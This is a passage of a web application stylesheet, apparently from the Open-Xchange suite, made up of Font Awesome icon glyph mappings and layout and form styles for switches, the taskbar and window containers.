            content: "\f20c";
        }

        .fa-buysellads:before {
            content: "\f20d";
        }

        .fa-connectdevelop:before {
            content: "\f20e";
        }

        .fa-dashcube:before {
            content: "\f210";
        }

        .fa-forumbee:before {
            content: "\f211";
        }

        .fa-leanpub:before {
            content: "\f212";
        }

        .fa-sellsy:before {
            content: "\f213";
        }

        .fa-shirtsinbulk:before {
            content: "\f214";
        }

        .fa-simplybuilt:before {
            content: "\f215";
        }

        .fa-skyatlas:before {
            content: "\f216";
        }

        .fa-cart-plus:before {
            content: "\f217";
        }

        .fa-cart-arrow-down:before {
            content: "\f218";
        }

        .fa-diamond:before {
            content: "\f219";
        }

        .fa-ship:before {
            content: "\f21a";
        }

        .fa-user-secret:before {
            content: "\f21b";
        }

        .fa-motorcycle:before {
            content: "\f21c";
        }

        .fa-street-view:before {
            content: "\f21d";
        }

        .fa-heartbeat:before {
            content: "\f21e";
        }

        .fa-venus:before {
            content: "\f221";
        }

        .fa-mars:before {
            content: "\f222";
        }

        .fa-mercury:before {
            content: "\f223";
        }

        .fa-intersex:before,
        .fa-transgender:before {
            content: "\f224";
        }

        .fa-transgender-alt:before {
            content: "\f225";
        }

        .fa-venus-double:before {
            content: "\f226";
        }

        .fa-mars-double:before {
            content: "\f227";
        }

        .fa-venus-mars:before {
            content: "\f228";
        }

        .fa-mars-stroke:before {
            content: "\f229";
        }

        .fa-mars-stroke-v:before {
            content: "\f22a";
        }

        .fa-mars-stroke-h:before {
            content: "\f22b";
        }

        .fa-neuter:before {
            content: "\f22c";
        }

        .fa-genderless:before {
            content: "\f22d";
        }

        .fa-facebook-official:before {
            content: "\f230";
        }

        .fa-pinterest-p:before {
            content: "\f231";
        }

        .fa-whatsapp:before {
            content: "\f232";
        }

        .fa-server:before {
            content: "\f233";
        }

        .fa-user-plus:before {
            content: "\f234";
        }

        .fa-user-times:before {
            content: "\f235";
        }

        .fa-hotel:before,
        .fa-bed:before {
            content: "\f236";
        }

        .fa-viacoin:before {
            content: "\f237";
        }

        .fa-train:before {
            content: "\f238";
        }

        .fa-subway:before {
            content: "\f239";
        }

        .fa-medium:before {
            content: "\f23a";
        }

        .fa-yc:before,
        .fa-y-combinator:before {
            content: "\f23b";
        }

        .fa-optin-monster:before {
            content: "\f23c";
        }

        .fa-opencart:before {
            content: "\f23d";
        }

        .fa-expeditedssl:before {
            content: "\f23e";
        }

        .fa-battery-4:before,
        .fa-battery:before,
        .fa-battery-full:before {
            content: "\f240";
        }

        .fa-battery-3:before,
        .fa-battery-three-quarters:before {
            content: "\f241";
        }

        .fa-battery-2:before,
        .fa-battery-half:before {
            content: "\f242";
        }

        .fa-battery-1:before,
        .fa-battery-quarter:before {
            content: "\f243";
        }

        .fa-battery-0:before,
        .fa-battery-empty:before {
            content: "\f244";
        }

        .fa-mouse-pointer:before {
            content: "\f245";
        }

        .fa-i-cursor:before {
            content: "\f246";
        }

        .fa-object-group:before {
            content: "\f247";
        }

        .fa-object-ungroup:before {
            content: "\f248";
        }

        .fa-sticky-note:before {
            content: "\f249";
        }

        .fa-sticky-note-o:before {
            content: "\f24a";
        }

        .fa-cc-jcb:before {
            content: "\f24b";
        }

        .fa-cc-diners-club:before {
            content: "\f24c";
        }

        .fa-clone:before {
            content: "\f24d";
        }

        .fa-balance-scale:before {
            content: "\f24e";
        }

        .fa-hourglass-o:before {
            content: "\f250";
        }

        .fa-hourglass-1:before,
        .fa-hourglass-start:before {
            content: "\f251";
        }

        .fa-hourglass-2:before,
        .fa-hourglass-half:before {
            content: "\f252";
        }

        .fa-hourglass-3:before,
        .fa-hourglass-end:before {
            content: "\f253";
        }

        .fa-hourglass:before {
            content: "\f254";
        }

        .fa-hand-grab-o:before,
        .fa-hand-rock-o:before {
            content: "\f255";
        }

        .fa-hand-stop-o:before,
        .fa-hand-paper-o:before {
            content: "\f256";
        }

        .fa-hand-scissors-o:before {
            content: "\f257";
        }

        .fa-hand-lizard-o:before {
            content: "\f258";
        }

        .fa-hand-spock-o:before {
            content: "\f259";
        }

        .fa-hand-pointer-o:before {
            content: "\f25a";
        }

        .fa-hand-peace-o:before {
            content: "\f25b";
        }

        .fa-trademark:before {
            content: "\f25c";
        }

        .fa-registered:before {
            content: "\f25d";
        }

        .fa-creative-commons:before {
            content: "\f25e";
        }

        .fa-gg:before {
            content: "\f260";
        }

        .fa-gg-circle:before {
            content: "\f261";
        }

        .fa-tripadvisor:before {
            content: "\f262";
        }

        .fa-odnoklassniki:before {
            content: "\f263";
        }

        .fa-odnoklassniki-square:before {
            content: "\f264";
        }

        .fa-get-pocket:before {
            content: "\f265";
        }

        .fa-wikipedia-w:before {
            content: "\f266";
        }

        .fa-safari:before {
            content: "\f267";
        }

        .fa-chrome:before {
            content: "\f268";
        }

        .fa-firefox:before {
            content: "\f269";
        }

        .fa-opera:before {
            content: "\f26a";
        }

        .fa-internet-explorer:before {
            content: "\f26b";
        }

        .fa-tv:before,
        .fa-television:before {
            content: "\f26c";
        }

        .fa-contao:before {
            content: "\f26d";
        }

        .fa-500px:before {
            content: "\f26e";
        }

        .fa-amazon:before {
            content: "\f270";
        }

        .fa-calendar-plus-o:before {
            content: "\f271";
        }

        .fa-calendar-minus-o:before {
            content: "\f272";
        }

        .fa-calendar-times-o:before {
            content: "\f273";
        }

        .fa-calendar-check-o:before {
            content: "\f274";
        }

        .fa-industry:before {
            content: "\f275";
        }

        .fa-map-pin:before {
            content: "\f276";
        }

        .fa-map-signs:before {
            content: "\f277";
        }

        .fa-map-o:before {
            content: "\f278";
        }

        .fa-map:before {
            content: "\f279";
        }

        .fa-commenting:before {
            content: "\f27a";
        }

        .fa-commenting-o:before {
            content: "\f27b";
        }

        .fa-houzz:before {
            content: "\f27c";
        }

        .fa-vimeo:before {
            content: "\f27d";
        }

        .fa-black-tie:before {
            content: "\f27e";
        }

        .fa-fonticons:before {
            content: "\f280";
        }

        .fa-reddit-alien:before {
            content: "\f281";
        }

        .fa-edge:before {
            content: "\f282";
        }

        .fa-credit-card-alt:before {
            content: "\f283";
        }

        .fa-codiepie:before {
            content: "\f284";
        }

        .fa-modx:before {
            content: "\f285";
        }

        .fa-fort-awesome:before {
            content: "\f286";
        }

        .fa-usb:before {
            content: "\f287";
        }

        .fa-product-hunt:before {
            content: "\f288";
        }

        .fa-mixcloud:before {
            content: "\f289";
        }

        .fa-scribd:before {
            content: "\f28a";
        }

        .fa-pause-circle:before {
            content: "\f28b";
        }

        .fa-pause-circle-o:before {
            content: "\f28c";
        }

        .fa-stop-circle:before {
            content: "\f28d";
        }

        .fa-stop-circle-o:before {
            content: "\f28e";
        }

        .fa-shopping-bag:before {
            content: "\f290";
        }

        .fa-shopping-basket:before {
            content: "\f291";
        }

        .fa-hashtag:before {
            content: "\f292";
        }

        .fa-bluetooth:before {
            content: "\f293";
        }

        .fa-bluetooth-b:before {
            content: "\f294";
        }

        .fa-percent:before {
            content: "\f295";
        }

        .fa-gitlab:before {
            content: "\f296";
        }

        .fa-wpbeginner:before {
            content: "\f297";
        }

        .fa-wpforms:before {
            content: "\f298";
        }

        .fa-envira:before {
            content: "\f299";
        }

        .fa-universal-access:before {
            content: "\f29a";
        }

        .fa-wheelchair-alt:before {
            content: "\f29b";
        }

        .fa-question-circle-o:before {
            content: "\f29c";
        }

        .fa-blind:before {
            content: "\f29d";
        }

        .fa-audio-description:before {
            content: "\f29e";
        }

        .fa-volume-control-phone:before {
            content: "\f2a0";
        }

        .fa-braille:before {
            content: "\f2a1";
        }

        .fa-assistive-listening-systems:before {
            content: "\f2a2";
        }

        .fa-asl-interpreting:before,
        .fa-american-sign-language-interpreting:before {
            content: "\f2a3";
        }

        .fa-deafness:before,
        .fa-hard-of-hearing:before,
        .fa-deaf:before {
            content: "\f2a4";
        }

        .fa-glide:before {
            content: "\f2a5";
        }

        .fa-glide-g:before {
            content: "\f2a6";
        }

        .fa-signing:before,
        .fa-sign-language:before {
            content: "\f2a7";
        }

        .fa-low-vision:before {
            content: "\f2a8";
        }

        .fa-viadeo:before {
            content: "\f2a9";
        }

        .fa-viadeo-square:before {
            content: "\f2aa";
        }

        .fa-snapchat:before {
            content: "\f2ab";
        }

        .fa-snapchat-ghost:before {
            content: "\f2ac";
        }

        .fa-snapchat-square:before {
            content: "\f2ad";
        }

        .fa-pied-piper:before {
            content: "\f2ae";
        }

        .fa-first-order:before {
            content: "\f2b0";
        }

        .fa-yoast:before {
            content: "\f2b1";
        }

        .fa-themeisle:before {
            content: "\f2b2";
        }

        .fa-google-plus-circle:before,
        .fa-google-plus-official:before {
            content: "\f2b3";
        }

        .fa-fa:before,
        .fa-font-awesome:before {
            content: "\f2b4";
        }

        .fa-handshake-o:before {
            content: "\f2b5";
        }

        .fa-envelope-open:before {
            content: "\f2b6";
        }

        .fa-envelope-open-o:before {
            content: "\f2b7";
        }

        .fa-linode:before {
            content: "\f2b8";
        }

        .fa-address-book:before {
            content: "\f2b9";
        }

        .fa-address-book-o:before {
            content: "\f2ba";
        }

        .fa-vcard:before,
        .fa-address-card:before {
            content: "\f2bb";
        }

        .fa-vcard-o:before,
        .fa-address-card-o:before {
            content: "\f2bc";
        }

        .fa-user-circle:before {
            content: "\f2bd";
        }

        .fa-user-circle-o:before {
            content: "\f2be";
        }

        .fa-user-o:before {
            content: "\f2c0";
        }

        .fa-id-badge:before {
            content: "\f2c1";
        }

        .fa-drivers-license:before,
        .fa-id-card:before {
            content: "\f2c2";
        }

        .fa-drivers-license-o:before,
        .fa-id-card-o:before {
            content: "\f2c3";
        }

        .fa-quora:before {
            content: "\f2c4";
        }

        .fa-free-code-camp:before {
            content: "\f2c5";
        }

        .fa-telegram:before {
            content: "\f2c6";
        }

        .fa-thermometer-4:before,
        .fa-thermometer:before,
        .fa-thermometer-full:before {
            content: "\f2c7";
        }

        .fa-thermometer-3:before,
        .fa-thermometer-three-quarters:before {
            content: "\f2c8";
        }

        .fa-thermometer-2:before,
        .fa-thermometer-half:before {
            content: "\f2c9";
        }

        .fa-thermometer-1:before,
        .fa-thermometer-quarter:before {
            content: "\f2ca";
        }

        .fa-thermometer-0:before,
        .fa-thermometer-empty:before {
            content: "\f2cb";
        }

        .fa-shower:before {
            content: "\f2cc";
        }

        .fa-bathtub:before,
        .fa-s15:before,
        .fa-bath:before {
            content: "\f2cd";
        }

        .fa-podcast:before {
            content: "\f2ce";
        }

        .fa-window-maximize:before {
            content: "\f2d0";
        }

        .fa-window-minimize:before {
            content: "\f2d1";
        }

        .fa-window-restore:before {
            content: "\f2d2";
        }

        .fa-times-rectangle:before,
        .fa-window-close:before {
            content: "\f2d3";
        }

        .fa-times-rectangle-o:before,
        .fa-window-close-o:before {
            content: "\f2d4";
        }

        .fa-bandcamp:before {
            content: "\f2d5";
        }

        .fa-grav:before {
            content: "\f2d6";
        }

        .fa-etsy:before {
            content: "\f2d7";
        }

        .fa-imdb:before {
            content: "\f2d8";
        }

        .fa-ravelry:before {
            content: "\f2d9";
        }

        .fa-eercast:before {
            content: "\f2da";
        }

        .fa-microchip:before {
            content: "\f2db";
        }

        .fa-snowflake-o:before {
            content: "\f2dc";
        }

        .fa-superpowers:before {
            content: "\f2dd";
        }

        .fa-wpexplorer:before {
            content: "\f2de";
        }

        .fa-meetup:before {
            content: "\f2e0";
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0;
            color: #000;
            background-color: #fff;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto;
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            overflow: visible;
            clip: auto;
            white-space: normal;
        }

        body {
            -webkit-font-feature-settings: "liga", "kern";
            font-feature-settings: "liga", "kern";
        }

        textarea,
        .user-select-text {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }

        textarea {
            resize: none;
        }

        html.ios input[type="datetime-local"],
        html.ios input[type="date"] {
            -webkit-appearance: textfield;
            -moz-appearance: textfield;
            padding-top: 0;
        }

        span.hint {
            font-size: 8pt;
            text-align: left;
        }

        .help-block.error {
            color: #a94442;
        }

        .io-ox-fail {
            padding: 4px;
            font-weight: normal;
            color: #767676;
        }

        .io-ox-center {
            display: table;
            width: 100%;
            height: 100%;
        }

        .io-ox-center>div {
            display: table-cell;
            text-align: center;
            vertical-align: middle;
        }

        legend,
        label {
            color: #666;
            margin-bottom: 5px;
            font-size: 13px;
            line-height: 20px;
        }

        legend *,
        label * {
            font-weight: normal;
        }

        .radio-inline,
        .checkbox-inline,
        .checkbox label,
        .radio label {
            font-size: 14px;
        }

        legend {
            padding-top: 8px;
            font-weight: bold;
        }

        legend.simple {
            margin: 0;
            border-bottom: 0 none;
        }

        legend.io-ox-label h2 {
            display: inline;
            font-size: 13px;
        }

        .btn-file {
            position: relative;
            overflow: hidden;
        }

        .btn-file input[type="file"] {
            position: absolute;
            top: 0;
            right: 0;
            min-width: 100%;
            min-height: 100%;
            font-size: 100px;
            text-align: right;
            filter: alpha(opacity=0);
            opacity: 0;
            background: red;
            cursor: inherit;
            display: block;
            outline: 0;
        }

        .btn-file i.fa-paperclip:after {
            content: "\00a0";
        }

        .btn-unstyled {
            width: 100%;
            text-align: left;
            padding: 0;
            background-color: transparent;
            border: none;
        }

        .btn-medium {
            padding: 8px 19px;
            font-size: 15.5px;
        }

        .action-button-rounded {
            margin: 24px 0 0 0;
        }

        .action-button-rounded button {
            font-size: 13px;
            line-height: 24px;
            padding: 0;
            margin: 0 24px 0 0;
        }

        .action-button-rounded>.dropdown {
            display: inline-block;
        }

        .action-button-rounded .fa:first-child {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 1px solid rgba(0, 119, 187, 0.4);
            background-color: rgba(0, 119, 187, 0.04);
            color: #07b;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 16px;
            margin: 0 auto;
        }

        .action-button-rounded i.fa.fa-phone {
            font-size: 24px;
        }

        .action-button-rounded .btn-link:hover:not(:disabled),
        .action-button-rounded .btn-link:focus {
            outline: 0;
            text-decoration: none;
        }

        .action-button-rounded .btn-link:hover:not(:disabled) i.fa:first-child,
        .action-button-rounded .btn-link:focus i.fa:first-child {
            color: white;
            background-color: #07b;
            border: 0;
        }

        .action-button-rounded.horizontal button {
            display: flex;
            align-items: center;
        }

        .action-button-rounded.horizontal button i.fa {
            margin-right: 8px;
        }

        .cursor-pointer,
        .label.pointer {
            cursor: pointer;
        }

        .badge.badge-deferred {
            background-color: #767676;
            color: #fff;
        }

        .badge.badge-inprogress {
            background-color: #767676;
            color: #fff;
        }

        .badge.badge-notstarted {
            background-color: #767676;
            color: #fff;
        }

        .badge.badge-done {
            background-color: #198819;
            color: #fff;
        }

        .badge.badge-waiting {
            background-color: #767676;
            color: #fff;
        }

        .badge.badge-overdue {
            background-color: #07b;
            color: #fff;
        }

        wbr:after {
            content: "\00200B";
        }

        .alert {
            padding: 8px 35px 8px 14px;
            margin-bottom: 20px;
        }

        .alert.indicator {
            margin-bottom: 0px;
        }

        .row label {
            padding-top: 8px;
        }

        .clear-title {
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-weight: 300;
            font-size: 20pt;
            line-height: 1.15em;
        }

        div.hopscotch-bubble * {
            box-sizing: content-box;
        }

        div.hopscotch-bubble div.hopscotch-bubble-content {
            margin: 0;
        }

        #background-loader.secure {
            background-color: rgba(255, 255, 255, 0);
        }

        #background-loader.secure.block {
            background-color: rgba(255, 255, 255, 0.5);
            text-align: center;
        }

        #background-loader.secure.block button {
            display: none;
            position: relative;
            top: 52%;
        }

        .auto-logout-dialog:not(.logout-failed) [data-action="retry"] {
            display: none;
        }

        @keyframes make-visible {
            99% {
                visibility: hidden;
            }

            100% {
                visibility: visible;
            }
        }

        .io-ox-busy {
            position: relative;
        }

        .io-ox-busy:before {
            visibility: hidden;
            position: absolute;
            top: 50%;
            left: 50%;
            margin: -10px 0 0 -10px;
            font-size: 20px;
            font-family: "FontAwesome";
            content: "\f021";
            color: #ccc;
            animation: fa-spin 1.5s infinite linear, 1ms make-visible forwards;
            animation-delay: 300ms;
        }

        .relogin-required .io-ox-busy:before {
            animation: 1ms make-visible forwards;
        }

        .io-ox-busy.immediate:before {
            animation-delay: 0ms;
        }

        #io-ox-core {
            z-index: 0;
            -webkit-backface-visibility: hidden;
            transition: filter 1s linear, opacity 1s linear;
        }

        #io-ox-core.wallpaper {
            background: #dcdcdc;
            background: -moz-radial-gradient(center, circle cover, #fff 0, #f6f6f6 40%, #a8a8a8 100%);
            background: -webkit-gradient(radial, center center, 0, center center, 100%, color-stop(0, #fff), color-stop(31%, #f6f6f6), color-stop(100%, #a8a8a8));
            background: -webkit-radial-gradient(center, ellipse cover, #fff 0, #f6f6f6 31%, #a8a8a8 100%);
            background: -o-radial-gradient(center, ellipse cover, #fff 0, #f6f6f6 31%, #a8a8a8 100%);
            background: -ms-radial-gradient(center, ellipse cover, #fff 0, #f6f6f6 31%, #a8a8a8 100%);
            background: radial-gradient(center, ellipse cover, #fff 0, #f6f6f6 31%, #a8a8a8 100%);
            filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#ffa8a8a8', GradientType=0);
        }

        #io-ox-offline {
            position: absolute;
            bottom: 0;
            width: 240px;
            left: 50%;
            margin-left: -120px;
            height: 40px;
            font-weight: bold;
            line-height: 40px;
            text-align: center;
            color: #fff;
            border: 1px solid #ff7000;
            border-width: 1px 1px 0 1px;
            background-color: #c00;
            cursor: default;
            z-index: 650000;
            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.3);
            border-radius: 5px 5px 0 0;
        }

        .io-ox-viewer {
            background-color: rgba(0, 0, 0, 0.85);
            z-index: 11;
        }

        .scrollable {
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            -webkit-tap-highlight-color: transparent;
        }

        html:not(.internet-explorer) .scrollable[tabindex]:focus,
        html:not(.internet-explorer) .listbox[tabindex]:focus {
            box-shadow: inset 0 0 0 2px #07b;
        }

        .internet-explorer .scrollable[tabindex]:focus,
        .internet-explorer .listbox[tabindex]:focus {
            border: 2px solid #07b;
        }

        .internet-explorer .scrollable[tabindex]:focus.default-content-padding:not(.no-padding-adjustment),
        .internet-explorer .listbox[tabindex]:focus.default-content-padding:not(.no-padding-adjustment) {
            padding: 18px 28px;
        }

        .list-view .gray,
        .vgrid .gray {
            color: #707070;
        }

        .list-view .selected:not(:focus) .gray,
        .vgrid .selected:not(:focus) .gray {
            color: #333333;
        }

        .list-view .vgrid-cell:hover .gray,
        .vgrid .vgrid-cell:hover .gray,
        .list-view .list-item:hover .gray,
        .vgrid .list-item:hover .gray {
            color: #555;
        }

        .focusable:focus,
        .list-item.focusable:focus {
            outline: 2px solid #07b;
        }

        .blockscroll {
            overflow: hidden !important;
        }

        .scrollable-pane {
            position: relative;
            width: 100%;
            min-height: 100%;
        }

        .scrollable-pane:after {
            content: "\00a0";
        }

        .ui-disabled {
            pointer-events: none;
            color: #ccc;
        }

        .atb,
        .abs {
            position: absolute;
            top: 0;
            bottom: 0;
        }

        .abs {
            left: 0;
            right: 0;
        }

        .abs-r {
            right: 0;
        }

        .abs-l {
            left: 0;
        }

        .ellipsis {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .person,
        .person-link {
            color: #333;
            word-break: normal;
            white-space: nowrap;
        }

        .from .person {
            color: inherit;
        }

        .person-link {
            cursor: pointer;
        }

        .default-content-padding {
            padding: 32px 32px;
        }

        .border-top {
            border-top: 1px solid #ddd;
        }

        .border-right {
            border-right: 1px solid #ddd;
        }

        .border-bottom {
            border-bottom: 1px solid #ddd;
        }

        .border-left {
            border-left: 1px solid #ddd;
        }

        .touch body {
            font-size: 16px;
        }

        @media (max-width: 767px) {
            body {
                padding-left: 0 !important;
                padding-right: 0 !important;
            }
        }

        @media (max-width: 900px) {
            .default-content-padding {
                padding: 26px 13px;
            }

            .internet-explorer .scrollable[tabindex].default-content-padding:focus:not(.no-padding-adjustment) {
                padding: 24px 11px;
            }
        }

        .form-spacer {
            margin-top: 32px;
        }

        .tooltip {
            z-index: 100000;
        }

        .center-childs {
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .password-container input.form-control {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            padding-right: 12px;
        }

        .password-container.has-focus input.form-control {
            padding-right: 50px;
        }

        .password-container .toggle-asterisks.form-control-feedback {
            display: none;
            height: 22px;
            padding: 0px 16px;
            top: 4px;
            right: 4px;
            bottom: 4px;
            z-index: 3;
            pointer-events: all;
            background-color: #e6e6e6;
            font-size: 16px;
        }

        .password-container .toggle-asterisks.form-control-feedback:focus {
            color: #ffffff;
            background-color: #f80;
        }

        .password-container.has-focus .toggle-asterisks {
            display: flex;
        }

        .blur {
            filter: blur(4px);
        }

        .ie11 .blur {
            opacity: 0;
        }

        h1.unstyled,
        h2.unstyled,
        h3.unstyled,
        h4.unstyled,
        h5.unstyled {
            margin: inherit;
            font-weight: inherit;
            font-size: inherit;
        }

        label.unstyled {
            color: inherit;
            line-height: inherit;
            font-size: inherit;
            font-weight: inherit;
            margin-bottom: inherit;
        }

        @media (max-width: 540px) and (orientation: portrait),
        (max-height: 540px) and (orientation: landscape) {
            .default-content-padding {
                padding: 5px 10px;
            }

            .internet-explorer .scrollable[tabindex].default-content-padding:focus:not(.no-padding-adjustment) {
                padding: 3px 8px;
            }

            .form-control {
                padding: 4px;
            }

            textarea.flat,
            input.flat {
                border-width: 0;
                border-bottom-width: 1px;
                box-shadow: none;
                border-radius: 0;
            }

            textarea.flat:focus,
            input.flat:focus {
                border-width: 0;
                box-shadow: none;
                border-bottom-width: 1px;
                border-color: initial;
            }

            .clear-title {
                font-size: 15pt;
            }

            #background-loader.secure.block {
                background-color: rgba(0, 0, 0, 0.6);
                height: 150%;
                position: fixed;
            }
        }

        ::-ms-clear {
            display: none;
        }

        .checkbox.custom,
        .radio.custom {
            margin-bottom: 8px;
            padding-left: 32px;
            font-size: 14px;
            line-height: 24px;
            position: relative;
        }

        .checkbox.custom label,
        .radio.custom label {
            padding: 0;
        }

        .checkbox.custom input,
        .radio.custom input {
            margin: 0;
            top: 3px;
            left: 0;
        }

        .checkbox.custom input:focus,
        .radio.custom input:focus {
            height: 17px;
            width: 16px;
        }

        .checkbox.custom input+i.toggle,
        .radio.custom input+i.toggle {
            text-align: left;
            position: absolute;
            width: 16px;
            height: 16px;
            border-radius: 3px;
            border: 1px solid #aaa;
            background-color: white;
            font: normal normal normal 12px/1 FontAwesome;
            text-rendering: auto;
            -webkit-font-smoothing: antialiased;
            left: 0;
            top: 4px;
            padding: 1px 0 0 1px;
            transition: background-color 0.2s;
        }

        .checkbox.custom input+i.toggle:before,
        .radio.custom input+i.toggle:before {
            display: none;
        }

        .checkbox.custom input:checked+i.toggle,
        .radio.custom input:checked+i.toggle {
            color: #fff;
            background-color: #07b;
            border-color: #07b;
        }

        .checkbox.custom input:checked+i.toggle:before,
        .radio.custom input:checked+i.toggle:before {
            content: "\f00c";
            display: inherit;
        }

        .checkbox.custom input:focus+i.toggle,
        .radio.custom input:focus+i.toggle {
            border-color: #03a9f4;
            box-shadow: 0 0 8px 1px rgba(3, 169, 244, 0.6);
        }

        .checkbox.custom input:disabled+i.toggle,
        .radio.custom input:disabled+i.toggle {
            opacity: 0.5;
            cursor: not-allowed;
            background-color: #eee;
        }

        .checkbox.custom input:checked:disabled+i.toggle,
        .radio.custom input:checked:disabled+i.toggle {
            border-color: #767676;
            background-color: #aaa;
        }

        .form-horizontal .checkbox.custom,
        .form-horizontal .radio.custom {
            padding-top: 0;
            top: 5px;
        }

        .radio.custom input+i.toggle {
            border-radius: 8px;
            padding: 4px;
        }

        .radio.custom input:checked+i.toggle:before {
            content: "";
            width: 6px;
            height: 6px;
            border-radius: 3px;
            background-color: #fff;
        }

        .checkbox.switch {
            margin-bottom: 8px;
            padding-left: 72px;
            position: relative;
        }

        .checkbox.switch label {
            padding: 0;
            line-height: 32px;
        }

        .checkbox.switch input+i.toggle {
            position: absolute;
            display: inline-block;
            vertical-align: middle;
            left: 0;
            height: 32px;
            width: 56px;
            border: 1px solid #767676;
            border-radius: 16px;
            margin-right: 16px;
            background-color: #eee;
            transition: border 0.2s, background-color 0.2s;
        }

        .checkbox.switch input+i.toggle:before {
            content: "";
            position: absolute;
            width: 30px;
            height: 30px;
            top: 0;
            left: 0;
            border-radius: 16px;
            background-color: white;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.4);
            transition: left 0.2s;
        }

        .checkbox.switch input:checked+i.toggle {
            border-color: transparent;
            background-color: #558b2f;
        }

        .checkbox.switch input:checked+i.toggle:before {
            left: 24px;
        }

        .checkbox.switch input:focus+i.toggle {
            border-color: #0064cd;
            box-shadow: 0 0 0 3px rgba(0, 100, 205, 0.4);
        }

        .checkbox.switch input:disabled+i.toggle {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .checkbox.switch input:checked:disabled+i.toggle {
            border-color: #767676;
            background-color: #aaa;
        }

        .checkbox.switch.small {
            padding-left: 56px;
        }

        .checkbox.switch.small label {
            line-height: 24px;
        }

        .checkbox.switch.small input+i.toggle {
            height: 24px;
            width: 40px;
            border-radius: 12px;
            margin-right: 12px;
        }

        .checkbox.switch.small input+i.toggle:before {
            width: 22px;
            height: 22px;
        }

        .checkbox.switch.small input:checked+i.toggle:before {
            left: 16px;
        }

        #io-ox-desktop {
            top: 32px;
            z-index: 1;
            overflow: hidden;
        }

        #io-ox-screens {
            top: 40px;
            overflow: hidden;
            z-index: 10;
        }

        html.taskbar-visible #io-ox-screens {
            bottom: 40px;
        }

        #io-ox-windowmanager {
            overflow: hidden;
            display: flex;
        }

        #io-ox-windowmanager-pane {
            flex: 1;
            position: relative;
        }

        .io-ox-windowmanager-sticky-panel {
            flex: 0 0 auto;
            position: relative;
        }

        #io-ox-taskbar-container {
            border-top: 1px solid #ccc;
            background-color: #f5f5f5;
            top: auto;
            height: 40px;
            padding: 3px 0 2px 0;
            margin: 0;
            display: none;
        }

        html.taskbar-visible #io-ox-taskbar-container {
            display: block;
        }

        #io-ox-taskbar-container #io-ox-taskbar {
            padding: 0 8px;
            list-style-type: none;
            overflow: hidden;
            margin: 0;
            width: 100%;
            display: flex;
        }

        #io-ox-taskbar-container #io-ox-taskbar li {
            width: 240px;
            margin-left: 8px;
            overflow: hidden;
            display: flex;
            height: 32px;
            line-height: 26px;
        }

        #io-ox-taskbar-container #io-ox-taskbar li i {
            margin-right: 8px;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button {
            border: 3px solid #464646;
            padding: 0 4px 0px 13px;
            border-radius: 0;
            color: white;
            text-align: left;
            width: 100%;
            overflow: hidden;
            background-color: #464646;
            display: flex;
            align-items: center;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button:focus {
            border-color: #00c7ff;
            font-weight: bold;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button.io-ox-busy:before {
            color: white;
            margin-top: -15px;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button .title {
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            margin-right: 8px;
            min-width: 26px;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button .count {
            padding: 4px 5px;
            margin-right: 8px;
        }

        #io-ox-taskbar-container #io-ox-taskbar li .taskbar-button .spacing {
            flex-grow: 1;
        }

        .touch #io-ox-screens {
            top: 40px;
        }

        .touch #io-ox-windowmanager .window-container-center {
            width: 100% !important;
        }

        .window-title {
            padding: 0 13px 0 13px;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", "Segoe UI", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol";
            font-weight: 300;
            font-size: 22px;
            line-height: 30px;
            text-shadow: 0 0 2px #000;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            display: block;
            margin: 0;
        }

        .window-title .badge {
            position: relative;
            display: inline-block;
            line-height: 1.4em;
            top: -3px;
            left: 10px;
        }

        .smartphone .window-container.header-top .window-body {
            top: 0;
            margin-bottom: 40px;
        }

        .smartphone .window-container.header-top .window-header {
            position: fixed;
            left: 0;
            right: 0;
            z-index: 25;
            bottom: 0;
            width: 100%;
            height: 40px;
            background-color: #ddd;
            padding: 0;
            border-top: 1px solid #07b;
        }

        .smartphone .window-container.header-top .window-header .container {
            padding-left: 0;
            padding-right: 0;
        }

        .smartphone .window-container.header-top .window-header .inline-yell {
            display: none;
        }

        .smartphone .window-container.header-top .window-header h1.title {
            display: none;
        }

        .smartphone .window-container.header-top .window-header a.btn {
            padding: 0;
            line-height: 40px;
            border: 0;
            border-radius: 0;
            margin: 0;
            height: 40px;
            width: 50%;
        }

        .smartphone .window-container.header-top .window-header button.btn {
            border: 0;
            border-radius: 0;
            margin: 0;
            height: 40px;
            width: 50%;
        }

        .window-container {
            position: absolute;
            top: 0;
            width: 100%;
            bottom: 0;
            left: 0;
        }

        .window-container.header-top .window-body {
            top: 48px;
            bottom: 0;
        }

        .window-container.header-top .window-header {
            position: absolute;
            width: 100%;
            height: 48px;
